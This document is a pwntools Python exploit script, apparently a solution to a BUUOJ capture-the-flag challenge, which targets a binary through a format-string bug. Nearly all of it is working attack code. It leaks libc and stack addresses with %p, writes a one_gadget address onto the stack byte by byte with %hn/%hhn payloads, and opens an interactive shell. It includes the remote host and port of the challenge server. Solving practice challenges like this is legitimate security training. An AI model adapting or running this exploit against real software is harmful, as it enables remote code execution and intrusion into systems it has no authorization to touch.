from pwn import *
context(arch='amd64', log_level='debug')
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path])
else:
    io = remote("node5.buuoj.cn", 26711)

def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

 
def fmt(msg):
    io.sendafter(b"Please enter a keyword\n", msg)
 
ddebug("b *0x400820") 
fmt("%9$p,%11$p,\0")
libc.address = int(io.recvuntil(b',', drop=True),16) - 240 - libc.sym['__libc_start_main']
stack = int(io.recvuntil(b',', drop=True),16)
log.success("libc: " + hex(libc.address))
ptr_i = stack - 0xef
ptr_rop = stack - 0xe0
print(f"{libc.address = :x} {stack = :x} {ptr_i = :x} {ptr_rop = :x}")

fmt(f"%{ptr_i&0xffff}c%11$hn\0")
 
one = p64(libc.address + 0x45226)
log.success(hex(libc.address+0x45226))
for i in range(6):
    #cleak i
    fmt(f"%{ptr_i&0xff}c%11$hhn\0")
    fmt(f"%37$n\0")
    #write rop
    fmt(f"%{(ptr_rop+i)&0xff}c%11$hhn\0")
    fmt(f"%{one[i]}c%37$hhn\0")
 
fmt('\0')
fmt('\0')
 
io.interactive() 
